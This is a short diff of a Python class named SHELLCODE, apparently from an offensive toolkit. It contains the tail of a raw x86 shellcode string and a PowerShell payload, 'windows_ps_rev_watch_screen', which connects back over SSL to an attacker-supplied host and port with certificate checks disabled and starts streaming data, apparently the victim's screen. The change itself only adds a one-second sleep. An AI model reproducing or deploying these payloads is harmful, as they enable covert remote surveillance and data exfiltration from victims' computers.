@@ -167,11 +167,10 @@ class SHELLCODE(object):
         "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3")
 
     windows_ps_rev_watch_screen = (
-
         "Try{Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
         "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
         "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$ssl.AuthenticateAsClient($env:computername);function SendResponse($sock, $string){$bytesSent = $sock.Write($string)};"
+        "$ssl.AuthenticateAsClient($env:computername);Start-Sleep -s 1;function SendResponse($sock, $string){$bytesSent = $sock.Write($string)};"
         "function SendStrResponse($sock, $string){$bytesSent = $sock.Write([text.Encoding]::Ascii.GetBytes($string))};"
         "function SendHeader($sock,$length,$statusCode = \"200 OK\",$mimeHeader=\"text/html\",$httpVersion=\"HTTP/1.1\"){$response = \"HTTP/1.1 $statusCode`r`n\" + \"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n\";"
         "SendStrResponse $sock $response;}SendHeader $ssl;"
